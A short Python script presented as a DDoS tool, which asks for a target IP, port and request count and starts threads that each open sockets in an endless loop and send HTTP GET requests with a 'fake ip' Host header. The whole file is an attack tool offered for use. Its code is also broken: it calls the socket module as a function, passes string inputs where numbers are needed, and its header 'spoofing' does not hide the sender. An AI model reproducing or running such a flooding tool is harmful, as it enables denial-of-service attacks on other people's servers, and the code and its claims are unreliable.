import socket
import threading


# Ttitle and main screen
print("-" * 100)
print("DDOS tool made by Senpai_Desim original Idea by Root Beer.")
print("-" * 100)

#Setting common information
target_ip = input("Enter target IP: ")
fake_ip = ("182.21.20.32")
port = input("Please provide an attack port. Standard HTTP port is 80: ")
target_amount = input("How many requests do you want to send?: ")

#Confirming 
print("-" * 200)
print(f" Target -> {target_ip} at port {port}. Using fake ip at {fake_ip} located in Japan with timezone Asia/Tokyo.")
print("-" * 200)


# Main attack
attack_num = 0
def attack():
    while True:
        s = socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

        global attack_num
        attack_num += 1
        print(f"Sent {attack_num} request.")
        s.close()



for i in range(target_amount):
    thread = threading.Thread(target = attack)
    thread.start()
